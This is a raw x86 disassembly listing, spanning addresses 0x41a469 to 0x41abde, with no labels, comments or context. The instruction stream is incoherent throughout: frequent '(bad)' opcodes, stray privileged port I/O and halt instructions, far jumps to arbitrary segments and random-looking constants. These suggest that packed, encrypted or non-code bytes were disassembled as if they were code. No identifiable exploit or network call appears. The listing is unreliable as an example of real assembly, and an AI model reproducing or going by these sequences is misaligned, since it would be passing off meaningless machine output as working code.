  41a469:	xchg   ecx,eax
  41a46a:	inc    esi
  41a46b:	inc    edi
  41a46c:	mov    edi,0x143752f0
  41a471:	inc    eax
  41a472:	push   ss
  41a473:	clc    
  41a474:	jg     0x41a400
  41a476:	repnz (bad) 
  41a478:	ins    BYTE PTR es:[edi],dx
  41a479:	retf   0x3063
  41a47c:	mov    ch,0xd7
  41a47e:	js     0x41a435
  41a480:	add    DWORD PTR [edi-0x151a0651],esp
  41a486:	sub    al,bl
  41a488:	sbb    al,BYTE PTR [edi-0x61fb6b02]
  41a48e:	int3   
  41a48f:	inc    ecx
  41a490:	jb     0x41a467
  41a492:	rcr    ebp,cl
  41a494:	imul   ebx,DWORD PTR [ecx],0xae4b58f4
  41a49a:	cs in  al,dx
  41a49c:	mov    bl,0xcf
  41a49e:	(bad)  
  41a49f:	out    dx,al
  41a4a0:	leave  
  41a4a1:	shr    dl,1
  41a4a3:	jg     0x41a4e0
  41a4a5:	int    0x1
  41a4a7:	push   esi
  41a4a8:	pop    ebx
  41a4a9:	lea    ebx,[eax+0x1a90f83f]
  41a4af:	shr    eax,1
  41a4b1:	retf   0x70f
  41a4b4:	fld    QWORD PTR [ebx+0x6e3d47b8]
  41a4ba:	mov    cl,0x1a
  41a4bc:	hlt    
  41a4bd:	jb     0x41a520
  41a4bf:	imul   ebp,DWORD PTR [edx-0x4055d862],0xffffff8b
  41a4c6:	popa   
  41a4c7:	fst    DWORD PTR [ebp+0x4a267459]
  41a4cd:	sbb    dh,dh
  41a4cf:	xor    eax,0x3c3d2785
  41a4d4:	outs   dx,DWORD PTR ds:[esi]
  41a4d5:	(bad)  [edx+0x135d2622]
  41a4db:	mov    WORD PTR cs:[esi],ss
  41a4de:	rcl    BYTE PTR [ebx-0x4a8672a6],cl
  41a4e4:	xor    al,0x5e
  41a4e6:	dec    ecx
  41a4e7:	pusha  
  41a4e8:	sbb    eax,0xfa305f5e
  41a4ed:	xchg   ebx,eax
  41a4ee:	and    cl,BYTE PTR [eax-0x74]
  41a4f1:	ins    DWORD PTR es:[edi],dx
  41a4f2:	sbb    ebx,DWORD PTR [ebx-0x3a]
  41a4f5:	push   cs
  41a4f6:	aam    0x79
  41a4f8:	cmc    
  41a4f9:	sbb    al,0x42
  41a4fb:	xor    eax,DWORD PTR ds:0x6bba8795
  41a501:	les    eax,FWORD PTR [ebx-0x7f79ef14]
  41a507:	fnsave [edi-0x7]
  41a50a:	das    
  41a50b:	or     DWORD PTR [edx-0x2722e99c],eax
  41a511:	pushf  
  41a512:	mov    ah,0x18
  41a514:	adc    al,0x1e
  41a516:	sbb    eax,0x77883277
  41a51b:	pop    esi
  41a51c:	and    eax,0x704142d
  41a521:	mov    esi,0xb1a98203
  41a526:	xor    ecx,eax
  41a528:	adc    dh,dl
  41a52a:	mov    DWORD PTR ds:[ebp-0x4d],edi
  41a52e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a52f:	lahf   
  41a530:	pushf  
  41a531:	out    0xa8,al
  41a533:	adc    al,0x24
  41a535:	sub    cl,BYTE PTR [esi+ebp*8-0x30]
  41a539:	sbb    ebx,DWORD PTR [edi+edx*1-0x26]
  41a53d:	jbe    0x41a52d
  41a53f:	add    BYTE PTR [edi+edi*1],al
  41a542:	adc    DWORD PTR [esi],esi
  41a544:	sbb    al,0x97
  41a546:	or     DWORD PTR [edi],0xffffffac
  41a549:	mov    ds:0x6681400e,eax
  41a54e:	or     dl,BYTE PTR [ebp+0x11d4e1bd]
  41a554:	(bad)  
  41a555:	shl    BYTE PTR [esi],1
  41a557:	dec    ecx
  41a558:	inc    esp
  41a559:	es inc ecx
  41a55b:	mov    dl,0x67
  41a55d:	mov    bl,0x21
  41a55f:	cwde   
  41a560:	lds    eax,FWORD PTR [eax]
  41a562:	xor    BYTE PTR [ecx+0x78],cl
  41a565:	idiv   DWORD PTR [esi+esi*2]
  41a568:	loopne 0x41a5af
  41a56a:	cmp    ebx,DWORD PTR [esp+ebx*8-0x2c]
  41a56e:	mov    bl,0xe4
  41a570:	dec    esi
  41a571:	xor    esi,DWORD PTR [edi+ecx*4-0x75]
  41a575:	into   
  41a576:	int3   
  41a577:	in     al,0x15
  41a579:	cmc    
  41a57a:	ror    BYTE PTR [ecx*2-0x71c623bb],1
  41a581:	dec    eax
  41a582:	xor    eax,0x954de8a7
  41a587:	cmp    eax,edi
  41a589:	inc    ebx
  41a58a:	repnz add al,0xa2
  41a58d:	retf   0xd483
  41a590:	add    eax,0x88de96bb
  41a595:	(bad)  
  41a596:	call   0x481fea36
  41a59b:	js     0x41a5df
  41a59d:	outs   dx,BYTE PTR ds:[esi]
  41a59e:	dec    BYTE PTR [ecx]
  41a5a0:	pop    esp
  41a5a1:	lock stos BYTE PTR es:[edi],al
  41a5a3:	out    dx,al
  41a5a4:	rcl    BYTE PTR [ebx-0x2c],0x26
  41a5a8:	xor    ah,bl
  41a5aa:	dec    ebx
  41a5ab:	lahf   
  41a5ac:	mov    ah,bl
  41a5ae:	mov    dl,0x9f
  41a5b0:	ret    
  41a5b1:	mov    fs,WORD PTR [eax]
  41a5b3:	lock xlat BYTE PTR ds:[ebx]
  41a5b5:	leave  
  41a5b6:	xor    eax,0x4628d3af
  41a5bb:	jmp    0xa0a2:0xec05e2de
  41a5c2:	rcr    DWORD PTR [esi],0x7
  41a5c5:	mov    edx,0x6f8535e2
  41a5ca:	jg     0x41a63a
  41a5cc:	retf   
  41a5cd:	ror    DWORD PTR [edi],1
  41a5cf:	pop    ebx
  41a5d0:	loope  0x41a562
  41a5d2:	ret    0xde0e
  41a5d5:	sbb    al,0x30
  41a5d7:	xchg   esp,eax
  41a5d8:	cld    
  41a5d9:	fcomp  QWORD PTR [esp+ebp*2-0x4cd3c64f]
  41a5e0:	pop    esi
  41a5e1:	add    BYTE PTR [ebx+0x237623b0],al
  41a5e7:	mov    edi,DWORD PTR [edi-0x11ed80e1]
  41a5ed:	and    al,0xc5
  41a5ef:	cs mov edx,0x28398e
  41a5f5:	adc    eax,0x9e16f4d3
  41a5fa:	outs   dx,DWORD PTR ds:[esi]
  41a5fb:	ror    BYTE PTR [esi],1
  41a5fd:	fisub  WORD PTR [ecx-0x30c93335]
  41a603:	rol    DWORD PTR [edx-0x2eb759c7],cl
  41a609:	jg     0x41a663
  41a60b:	data16 jb 0x41a652
  41a60e:	mov    ah,0x20
  41a610:	xor    al,0x26
  41a612:	adc    dh,bl
  41a614:	push   esi
  41a615:	fsubp  st(6),st
  41a617:	mov    al,ds:0x902480a8
  41a61c:	pop    ss
  41a61d:	cli    
  41a61e:	push   esi
  41a61f:	push   esp
  41a620:	pop    esi
  41a621:	or     cl,dh
  41a623:	jl     0x41a653
  41a625:	xor    DWORD PTR [eax+eax*8],ecx
  41a628:	(bad)
  41a62b:	dec    esp
  41a62c:	std    
  41a62d:	sub    al,0x89
  41a62f:	cmc    
  41a630:	loope  0x41a6ae
  41a632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a633:	add    eax,0xf3814c6a
  41a638:	mov    ds:0x756426ab,al
  41a63d:	mov    eax,ds:0x72f4bfe0
  41a642:	int3   
  41a643:	sbb    al,0xee
  41a645:	adc    esp,DWORD PTR [esi+0x20]
  41a648:	mov    cl,0xb8
  41a64a:	fsubr  DWORD PTR [esi]
  41a64c:	jp     0x41a6c3
  41a64e:	or     DWORD PTR [ebp+0x3b69d623],edi
  41a654:	xor    dl,dl
  41a656:	xchg   esi,eax
  41a657:	xor    DWORD PTR ds:0xf92186f2,esi
  41a65d:	xchg   ebp,eax
  41a65e:	sbb    al,0x5d
  41a660:	xchg   ebx,eax
  41a661:	cmp    ch,al
  41a663:	and    BYTE PTR ds:0x90cc018c,0x8f
  41a66a:	or     eax,0xb9372305
  41a66f:	iret   
  41a670:	repz sbb al,0xa6
  41a673:	add    DWORD PTR [ecx],esp
  41a675:	ins    DWORD PTR es:[edi],dx
  41a676:	shr    DWORD PTR [ecx],cl
  41a678:	xor    BYTE PTR [edx],0xa5
  41a67b:	jg     0x41a5fd
  41a67d:	loop   0x41a61a
  41a67f:	pop    edx
  41a680:	test   BYTE PTR [ecx+0x2a],dh
  41a683:	sub    DWORD PTR [edx-0x4e],0x3b
  41a687:	push   0x3d8dc759
  41a68c:	pop    ds
  41a68d:	sbb    eax,0x7d90a11c
  41a692:	mov    DWORD PTR [eax+0x75f1aa1b],ebp
  41a698:	mov    WORD PTR [ebx-0x452b8176],es
  41a69e:	jns    0x41a622
  41a6a0:	mov    eax,0x6a74ace8
  41a6a5:	out    dx,al
  41a6a6:	push   ds
  41a6a7:	mov    esp,DWORD PTR [eax+edi*2-0x7b41e1b4]
  41a6ae:	sbb    BYTE PTR [ecx-0x555b46cc],ch
  41a6b4:	retf   
  41a6b5:	ret    
  41a6b6:	in     eax,dx
  41a6b7:	call   edx
  41a6b9:	adc    BYTE PTR [eax+0x36f76359],dl
  41a6bf:	sti    
  41a6c0:	in     al,dx
  41a6c1:	mov    WORD PTR [edx-0x41],es
  41a6c4:	inc    ecx
  41a6c5:	ret    0xb7ac
  41a6c8:	push   ebp
  41a6c9:	in     al,dx
  41a6ca:	dec    ebx
  41a6cb:	push   esi
  41a6cc:	xor    eax,0xb5a4261a
  41a6d1:	pop    ebp
  41a6d2:	rol    esp,cl
  41a6d4:	mov    cl,0xa
  41a6d6:	xchg   edx,eax
  41a6d7:	data16 jg 0x41a6ec
  41a6da:	fcomp  QWORD PTR [eax]
  41a6dc:	je     0x41a71d
  41a6de:	jnp    0x41a746
  41a6e0:	mov    ebx,0x8fda4331
  41a6e5:	fadd   st(4),st
  41a6e7:	fdivr  st,st(0)
  41a6e9:	cmc    
  41a6ea:	or     dh,BYTE PTR [ebx]
  41a6ec:	fild   QWORD PTR [edx+eax*4+0x7d]
  41a6f0:	add    DWORD PTR [ebp+esi*2+0x52ff6c7a],edi
  41a6f7:	and    eax,0x438522d6
  41a6fc:	loope  0x41a68b
  41a6fe:	(bad)  
  41a6ff:	jecxz  0x41a684
  41a701:	xor    cl,dh
  41a703:	shl    BYTE PTR [ebp-0x3d],0xf0
  41a707:	inc    edi
  41a708:	or     eax,0xa224fd57
  41a70d:	fisttp DWORD PTR [esi-0x72]
  41a710:	dec    eax
  41a711:	jp     0x41a759
  41a713:	shl    cl,cl
  41a715:	xor    esi,DWORD PTR [esi+0x72]
  41a718:	push   0x6e
  41a71a:	mulps  xmm5,XMMWORD PTR [eax-0x79]
  41a71e:	out    0xf6,al
  41a720:	outs   dx,BYTE PTR fs:[esi]
  41a722:	je     0x41a6e2
  41a724:	(bad)  
  41a725:	out    dx,eax
  41a726:	call   0x113a:0xe3ccf052
  41a72d:	jp     0x41a726
  41a72f:	xchg   ebp,eax
  41a730:	push   esp
  41a731:	sub    DWORD PTR [ebp+ebp*1+0x13],0x6d
  41a736:	adc    eax,0x3e6c3d7c
  41a73b:	test   DWORD PTR [ebx-0x3325e6f],0xf01adf5a
  41a745:	pusha  
  41a746:	jne    0x41a7aa
  41a748:	pop    ecx
  41a749:	and    DWORD PTR [eax-0x33],0x58
  41a74d:	xchg   ebp,eax
  41a74e:	jl     0x41a735
  41a750:	outs   dx,BYTE PTR ds:[esi]
  41a751:	imul   eax,DWORD PTR [edi+0x7c],0xf22d88ec
  41a758:	mov    ds:0xfeb85295,eax
  41a75d:	mov    esi,0x55e431bb
  41a762:	cs mov edi,0xb207becf
  41a768:	push   cs
  41a769:	jle    0x41a753
  41a76b:	stos   DWORD PTR es:[edi],eax
  41a76c:	inc    edx
  41a76d:	xchg   ebx,eax
  41a76e:	pop    ecx
  41a76f:	test   eax,0xa0e78b3b
  41a774:	push   edx
  41a775:	or     al,al
  41a777:	aam    0xf1
  41a779:	fwait
  41a77a:	cmp    eax,0xd00725fa
  41a77f:	rol    DWORD PTR [edx+0x57149c4c],cl
  41a785:	mov    DWORD PTR [esi+0x79],edi
  41a788:	add    cl,cl
  41a78a:	inc    edx
  41a78b:	xor    eax,0x109649ef
  41a790:	and    eax,0x2d58b31a
  41a795:	push   ss
  41a796:	xor    eax,0xdf44e705
  41a79b:	sahf   
  41a79c:	add    esi,DWORD PTR [ecx]
  41a79e:	aad    0xfb
  41a7a0:	xor    dh,BYTE PTR [ebp-0x75680dae]
  41a7a6:	ins    DWORD PTR es:[edi],dx
  41a7a7:	pop    ebp
  41a7a8:	xchg   esp,eax
  41a7a9:	int3   
  41a7aa:	inc    ebx
  41a7ab:	mov    edx,0xec6142ce
  41a7b0:	jl     0x41a751
  41a7b2:	push   edi
  41a7b3:	scas   eax,DWORD PTR es:[edi]
  41a7b4:	enter  0x45c7,0x83
  41a7b8:	bound  esi,QWORD PTR [ebx-0x42]
  41a7bb:	fmul   DWORD PTR [eax-0x42faf647]
  41a7c1:	xchg   esi,eax
  41a7c2:	fdivr  st,st(5)
  41a7c4:	les    edi,FWORD PTR [ecx+0x1d]
  41a7c7:	adc    al,0x82
  41a7c9:	adc    al,0x87
  41a7cb:	ror    BYTE PTR ds:0x11a980d5,0x82
  41a7d2:	sahf   
  41a7d3:	enter  0xfcd3,0xe7
  41a7d7:	cld    
  41a7d8:	add    eax,0xe27e0812
  41a7dd:	push   edi
  41a7de:	(bad)  
  41a7df:	sbb    ecx,DWORD PTR [esi-0x654af999]
  41a7e5:	jmp    0x2ad9:0x2aa99d72
  41a7ec:	jne    0x41a7bc
  41a7ee:	inc    edx
  41a7ef:	xor    ebx,ebx
  41a7f1:	out    dx,eax
  41a7f2:	in     eax,dx
  41a7f3:	adc    eax,DWORD PTR [ecx+0x46]
  41a7f6:	outs   dx,BYTE PTR ds:[esi]
  41a7f7:	xor    dl,BYTE PTR [eax]
  41a7f9:	into   
  41a7fa:	inc    esi
  41a7fb:	dec    eax
  41a7fc:	outs   dx,BYTE PTR ds:[esi]
  41a7fd:	sub    al,0xbd
  41a7ff:	adc    BYTE PTR [ebx+0x48],dl
  41a802:	jge    0x41a7e8
  41a804:	push   cs
  41a805:	xor    al,0xda
  41a807:	outs   dx,BYTE PTR ds:[esi]
  41a808:	ss sti 
  41a80a:	cmp    al,0xc6
  41a80c:	std    
  41a80d:	sub    DWORD PTR [eax-0x2c],ebx
  41a810:	or     ebx,DWORD PTR [esi]
  41a812:	mov    ds:0x7366b283,al
  41a817:	ds cwde 
  41a819:	cmp    eax,0x93ba03d6
  41a81e:	pusha  
  41a81f:	push   esp
  41a820:	xchg   ecx,eax
  41a821:	sbb    BYTE PTR [edi],bh
  41a823:	pop    edi
  41a824:	push   eax
  41a825:	mov    bh,0x60
  41a827:	adc    ah,BYTE PTR [eax+0x19]
  41a82a:	mov    bl,0x90
  41a82c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a82d:	dec    ebx
  41a82e:	xchg   esp,eax
  41a82f:	adc    DWORD PTR [edx-0x617acff6],ebp
  41a835:	ficom  DWORD PTR [esi+edi*2+0x6a6d29cb]
  41a83c:	out    0x1a,al
  41a83e:	inc    esi
  41a83f:	jecxz  0x41a7fa
  41a841:	arpl   WORD PTR ds:0x56094af4,ax
  41a847:	mov    BYTE PTR [ebp+esi*4+0x78d79d13],dh
  41a84e:	fstp   QWORD PTR [ebp-0x53]
  41a851:	pop    eax
  41a852:	fcmovu st,st(6)
  41a854:	inc    ebx
  41a855:	stos   BYTE PTR es:[edi],al
  41a856:	dec    esi
  41a857:	shl    edx,cl
  41a859:	push   0xd8b1d8c1
  41a85e:	and    ch,BYTE PTR [ebp+edi*8-0x1dbe25c1]
  41a865:	mov    bh,0x25
  41a867:	and    eax,0x14afff7c
  41a86c:	je     0x41a7f4
  41a86e:	pop    es
  41a86f:	xor    eax,0xf791e825
  41a874:	pop    ss
  41a875:	cmp    bl,bh
  41a877:	ins    DWORD PTR es:[edi],dx
  41a878:	dec    ecx
  41a879:	(bad)  
  41a87a:	ret    0x307c
  41a87d:	arpl   WORD PTR [ebx-0x6a],di
  41a880:	push   ebp
  41a881:	cmp    DWORD PTR [ecx+0x7837bb1c],esp
  41a887:	ja     0x41a86c
  41a889:	call   esp
  41a88b:	in     al,0xab
  41a88d:	ret    
  41a88e:	xchg   esp,eax
  41a88f:	mov    WORD PTR [ecx+0x460cd3f2],?
  41a895:	add    ebp,edi
  41a897:	mov    ax,0xe10f
  41a89b:	and    bh,BYTE PTR [esi-0x42ccee84]
  41a8a1:	dec    edi
  41a8a2:	mov    ebp,edx
  41a8a4:	push   ecx
  41a8a5:	ds jp  0x41a868
  41a8a8:	push   ecx
  41a8a9:	shl    BYTE PTR [esi-0x4],cl
  41a8ac:	mov    ebx,0x1ce4e296
  41a8b1:	test   al,bl
  41a8b3:	mov    ebp,0x46e68955
  41a8b8:	xlat   BYTE PTR ds:[ebx]
  41a8b9:	mov    edx,0x9685750
  41a8be:	inc    DWORD PTR [edi+edi*8+0x370caa65]
  41a8c5:	dec    esp
  41a8c6:	inc    ebp
  41a8c7:	lds    ebx,FWORD PTR [edi-0x44]
  41a8ca:	push   edx
  41a8cb:	add    ebp,esp
  41a8cd:	shl    DWORD PTR [edi*1+0x7927e9f9],0x87
  41a8d5:	stos   BYTE PTR es:[edi],al
  41a8d6:	aas    
  41a8d7:	addr16 pop ds
  41a8d9:	push   cs
  41a8da:	cmp    esi,DWORD PTR fs:[edi-0x59]
  41a8de:	aas    
  41a8df:	sub    bh,ch
  41a8e1:	jns    0x41a91d
  41a8e3:	call   0xd1c7418
  41a8e8:	pop    ss
  41a8e9:	dec    ecx
  41a8ea:	sub    BYTE PTR [edx+0x32977b07],ch
  41a8f0:	rcl    edx,1
  41a8f2:	or     al,0xf8
  41a8f4:	mov    ch,0x23
  41a8f6:	fdiv   QWORD PTR [eax]
  41a8f8:	xchg   DWORD PTR [edx],edx
  41a8fa:	mov    ch,0x12
  41a8fc:	pop    ds
  41a8fd:	dec    ebp
  41a8fe:	pop    edi
  41a8ff:	pop    es
  41a900:	nop
  41a901:	xor    eax,0xf8a668e4
  41a906:	cmp    dl,ch
  41a908:	aad    0x2a
  41a90a:	jle    0x41a919
  41a90c:	cmp    ebx,0xffffffb8
  41a90f:	xchg   ecx,eax
  41a910:	or     ah,cl
  41a912:	test   al,0x45
  41a914:	push   ebp
  41a915:	into   
  41a916:	les    esp,FWORD PTR [ecx]
  41a918:	inc    ebp
  41a919:	mov    ecx,0xabf3dce8
  41a91e:	push   edx
  41a91f:	push   ebx
  41a920:	sub    al,0xb
  41a922:	mov    ds:0x8dc4fb5b,al
  41a927:	jl     0x41a91b
  41a929:	sbb    esp,DWORD PTR [esi+0x18]
  41a92c:	(bad)  
  41a92d:	pop    ss
  41a92e:	loopne 0x41a9a8
  41a930:	test   BYTE PTR [edx-0xed485df],bl
  41a936:	rol    ah,1
  41a938:	pop    edx
  41a93a:	mov    edx,0xb00a1f62
  41a93f:	addr16 inc eax
  41a941:	xor    bh,0xb5
  41a944:	ss hlt 
  41a946:	es enter 0xfd70,0xcc
  41a94b:	dec    ebp
  41a94c:	mov    eax,0x82dc2663
  41a951:	and    al,0x7d
  41a953:	shl    BYTE PTR [esi+0x59b7e305],cl
  41a959:	pop    esp
  41a95a:	iret   
  41a95b:	fidiv  DWORD PTR fs:[esi-0x2a29e958]
  41a962:	mov    eax,ds:0x3d71dd87
  41a967:	jmp    0xcf4c9861
  41a96c:	push   ss
  41a96d:	or     al,0xe5
  41a96f:	push   0x2b
  41a971:	retf   
  41a972:	(bad)  
  41a973:	dec    ebp
  41a974:	pop    ds
  41a975:	aam    0x43
  41a977:	push   es
  41a978:	fsubr  DWORD PTR [edx]
  41a97a:	arpl   WORD PTR [ebp-0x29],sp
  41a97d:	sub    ecx,DWORD PTR ds:0x7b9a2782
  41a983:	adc    BYTE PTR [eax-0x3984f45c],al
  41a989:	jge    0x41a959
  41a98b:	nop
  41a98c:	imul   ebx,DWORD PTR [eax-0x3bc658fb],0xe83db5dd
  41a996:	sbb    al,0x66
  41a998:	sbb    eax,esi
  41a99a:	xor    dh,BYTE PTR [edx]
  41a99c:	or     bh,bl
  41a99e:	not    BYTE PTR ds:0x86ccdd6d
  41a9a4:	xchg   esp,eax
  41a9a5:	imul   ebx,esp,0x34
  41a9a8:	mov    ebp,0xb293756e
  41a9ad:	xor    edi,esp
  41a9af:	fucomi st,st(0)
  41a9b1:	in     eax,dx
  41a9b2:	fdivr  st,st(4)
  41a9b4:	xchg   DWORD PTR [eax],ebx
  41a9b6:	xchg   DWORD PTR [ebx],esi
  41a9b8:	cwde   
  41a9b9:	mov    ah,BYTE PTR [esi]
  41a9bb:	out    dx,al
  41a9bc:	mov    dl,0x96
  41a9be:	cmp    edx,edi
  41a9c0:	sbb    al,0x78
  41a9c2:	xor    DWORD PTR [ebx-0x208ac325],esi
  41a9c8:	sbb    ecx,0xae5fdaab
  41a9ce:	pop    eax
  41a9cf:	dec    esi
  41a9d0:	sbb    BYTE PTR [edi],dl
  41a9d2:	add    ch,dh
  41a9d4:	sbb    DWORD PTR [edx-0x6e31c1db],edi
  41a9da:	xchg   DWORD PTR ss:[esi-0x788631b0],edi
  41a9e1:	push   edi
  41a9e2:	xchg   ebx,eax
  41a9e3:	push   0xffffff8c
  41a9e5:	or     ecx,DWORD PTR [esi]
  41a9e7:	sbb    BYTE PTR [eax-0x32b9265d],0x8f
  41a9ee:	ret    0x9902
  41a9f1:	ds jae 0x41aa43
  41a9f4:	sar    BYTE PTR [ebx-0x14f6059d],cl
  41a9fa:	out    0x1f,eax
  41a9fc:	lahf   
  41a9fd:	mov    cs,WORD PTR [esi-0x7d89a095]
  41aa03:	xlat   BYTE PTR ds:[ebx]
  41aa04:	ja     0x41aa83
  41aa06:	loopne 0x41aa2d
  41aa08:	jmp    0x41a999
  41aa0a:	jno    0x41aa7f
  41aa0c:	or     DWORD PTR [ecx],ecx
  41aa0e:	dec    esp
  41aa0f:	out    0xfe,eax
  41aa11:	adc    al,0x47
  41aa13:	shl    esp,cl
  41aa15:	mov    eax,0x6be35a5c
  41aa1a:	and    BYTE PTR [edi-0x7f],0x52
  41aa1e:	xchg   esi,eax
  41aa1f:	test   DWORD PTR [eax-0x445d0094],edx
  41aa25:	retf   0x278e
  41aa28:	push   edi
  41aa29:	pop    eax
  41aa2a:	stos   DWORD PTR es:[edi],eax
  41aa2b:	leave  
  41aa2c:	sbb    cl,BYTE PTR [ecx-0x1d90006d]
  41aa32:	dec    ebx
  41aa33:	lods   al,BYTE PTR ds:[esi]
  41aa34:	imul   eax,ebp,0xe1076ca0
  41aa3a:	jae    0x41aa56
  41aa3c:	into   
  41aa3d:	mov    edx,0xf82b32a4
  41aa42:	inc    edi
  41aa43:	and    DWORD PTR [ebx],edi
  41aa45:	test   cl,bh
  41aa47:	push   edx
  41aa48:	retf   
  41aa49:	out    dx,al
  41aa4a:	std    
  41aa4b:	inc    esi
  41aa4c:	mov    ebp,0x29a49df7
  41aa51:	sbb    esp,esp
  41aa53:	sbb    DWORD PTR [eax+0x361eb298],esp
  41aa59:	les    eax,FWORD PTR [esi+0x6f]
  41aa5c:	dec    edx
  41aa5d:	std    
  41aa5e:	push   esi
  41aa5f:	out    0xf,al
  41aa61:	popa   
  41aa62:	imul   ebx,eax,0x67
  41aa65:	sub    BYTE PTR [ecx+0x73],al
  41aa68:	mov    al,ds:0x63183fb8
  41aa6d:	pop    edi
  41aa6e:	jle    0x41aa40
  41aa70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa71:	mov    esp,0x4473621c
  41aa76:	lods   al,BYTE PTR ds:[esi]
  41aa77:	gs retf 0x7346
  41aa7b:	iret   
  41aa7c:	jae    0x41aa1a
  41aa7e:	mov    ah,0xa
  41aa80:	jmp    0xd9d6b524
  41aa85:	cli    
  41aa86:	mov    esp,0x140963ca
  41aa8b:	popa   
  41aa8c:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41aa8e:	call   0x9abe:0x513328cc
  41aa95:	jo     0x41aa84
  41aa97:	gs push edi
  41aa99:	bound  ebp,QWORD PTR [ecx+0x4f2e5032]
  41aa9f:	cs push 0xffffffba
  41aaa2:	mov    dl,BYTE PTR [ebp+0xf5fa1cc]
  41aaa8:	push   esp
  41aaa9:	jecxz  0x41aac8
  41aaab:	out    dx,al
  41aaac:	or     al,0xe6
  41aaae:	fcomip st,st(4)
  41aab0:	test   cl,ah
  41aab2:	adc    cl,0x74
  41aab5:	sbb    cl,bl
  41aab7:	adc    ecx,DWORD PTR [edx-0x2c6bf08f]
  41aabd:	mov    ebp,0x20c1ee88
  41aac2:	or     eax,0x82b87442
  41aac7:	jns    0x41aab5
  41aac9:	sub    esi,DWORD PTR [eax]
  41aacb:	ss in  eax,dx
  41aacd:	mov    BYTE PTR [ebp-0x70],dl
  41aad0:	pop    edi
  41aad1:	mov    ch,0x3c
  41aad3:	sti    
  41aad4:	adc    al,0x8f
  41aad6:	das    
  41aad7:	adc    BYTE PTR [edx-0x64],0xda
  41aadb:	inc    esi
  41aadc:	sar    BYTE PTR [edx+0x397107a1],1
  41aae2:	and    edi,DWORD PTR [ebp-0x1b]
  41aae5:	daa    
  41aae6:	inc    ebp
  41aae7:	mov    cl,dh
  41aae9:	pop    ebx
  41aaea:	(bad)  
  41aaeb:	lods   eax,DWORD PTR ds:[esi]
  41aaec:	sub    BYTE PTR [ecx+ebp*4-0x7b],0x4
  41aaf1:	jbe    0x41aa9d
  41aaf3:	pop    edi
  41aaf4:	sbb    ch,BYTE PTR [ecx+0x34]
  41aaf7:	in     eax,0xe2
  41aaf9:	inc    esp
  41aafa:	hlt    
  41aafb:	xchg   edi,eax
  41aafc:	jmp    DWORD PTR [ebx]
  41aafe:	pop    esi
  41aaff:	(bad)  
  41ab00:	out    0xb9,eax
  41ab02:	xor    esp,DWORD PTR [edi+0x5de70530]
  41ab08:	cwde   
  41ab09:	iret   
  41ab0a:	js     0x41ab12
  41ab0c:	lods   eax,DWORD PTR ds:[esi]
  41ab0d:	add    al,0x33
  41ab0f:	in     al,0x74
  41ab11:	push   esp
  41ab12:	or     esi,ebp
  41ab14:	pop    edi
  41ab15:	out    0xe1,eax
  41ab17:	(bad)  
  41ab18:	repz sti 
  41ab1a:	adc    bl,BYTE PTR [edx-0x46]
  41ab1d:	inc    ebp
  41ab1e:	or     ebx,eax
  41ab20:	push   esi
  41ab21:	add    dl,dl
  41ab23:	mov    dl,0xfa
  41ab25:	jmp    0x41aadb
  41ab27:	ins    DWORD PTR es:[edi],dx
  41ab28:	inc    ecx
  41ab29:	jb     0x41ab31
  41ab2b:	into   
  41ab2c:	pop    eax
  41ab2d:	lods   eax,DWORD PTR ds:[esi]
  41ab2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab2f:	xchg   BYTE PTR [eax],dh
  41ab31:	dec    ebx
  41ab32:	push   ss
  41ab33:	faddp  st(4),st
  41ab35:	dec    ebp
  41ab36:	xchg   ecx,eax
  41ab37:	retf   
  41ab38:	(bad)  
  41ab3a:	xchg   ebx,eax
  41ab3b:	xor    al,0x41
  41ab3d:	or     BYTE PTR [edx],bl
  41ab3f:	inc    ebp
  41ab40:	in     eax,dx
  41ab41:	repz or cl,cl
  41ab44:	hlt    
  41ab45:	jns    0x41ab5c
  41ab47:	stos   BYTE PTR es:[edi],al
  41ab48:	stos   BYTE PTR es:[edi],al
  41ab49:	rcl    BYTE PTR [ebx+0x31f6201e],1
  41ab4f:	out    dx,al
  41ab50:	(bad)  
  41ab51:	fistp  QWORD PTR [edi]
  41ab53:	xlat   BYTE PTR ds:[ebx]
  41ab54:	fadd   st(4),st
  41ab56:	(bad)  [ecx+0x66ca5c2f]
  41ab5c:	shl    BYTE PTR [esi+0x32d50dbf],cl
  41ab62:	jno    0x41ab62
  41ab64:	push   esi
  41ab65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab66:	mov    al,BYTE PTR [edi]
  41ab68:	add    DWORD PTR cs:[esi+0x66596392],0xdfb2bc69
  41ab73:	mov    eax,0x854f1676
  41ab78:	sbb    edi,ecx
  41ab7a:	xchg   edi,eax
  41ab7b:	and    DWORD PTR [esi-0x63],ebp
  41ab7e:	cwde   
  41ab7f:	adc    BYTE PTR [eax-0x70c761ac],bh
  41ab85:	lahf   
  41ab86:	and    ecx,ebp
  41ab88:	into   
  41ab89:	imul   DWORD PTR [ebp+0x5b]
  41ab8c:	rcr    BYTE PTR [ecx+0x35be0159],0xa5
  41ab93:	add    ebx,ebp
  41ab95:	cmp    bh,BYTE PTR [esp+ebx*2]
  41ab98:	add    bl,0x51
  41ab9b:	outs   dx,DWORD PTR ds:[esi]
  41ab9c:	push   0xffffffa8
  41ab9e:	mov    ah,0x53
  41aba0:	stc    
  41aba1:	inc    esi
  41aba2:	mov    esi,0x4438821d
  41aba7:	push   esp
  41aba8:	xor    bh,al
  41abaa:	adc    DWORD PTR [ebx],ebp
  41abac:	sbb    ch,BYTE PTR [edx+eiz*4+0x5e31dfab]
  41abb3:	shl    DWORD PTR [edi],cl
  41abb5:	ss in  al,dx
  41abb7:	clc    
  41abb8:	mov    ch,0xd
  41abba:	aas    
  41abbb:	retf   
  41abbc:	push   edi
  41abbd:	push   ss
  41abbe:	fild   WORD PTR [ecx]
  41abc0:	push   ds
  41abc1:	jl     0x41ab5f
  41abc3:	btr    edx,esp
  41abc6:	nop
  41abc7:	pusha  
  41abc8:	pop    eax
  41abc9:	loopne 0x41ab4d
  41abcb:	stos   DWORD PTR es:[edi],eax
  41abcc:	xchg   edi,eax
  41abcd:	mov    ds:0x2809eaea,al
  41abd2:	mov    ebp,0xd776c39
  41abd7:	sbb    BYTE PTR [edi],dh
  41abd9:	mov    ebp,0x9af64dd3
  41abde:	jmp    0x6529:0xaf6432ab
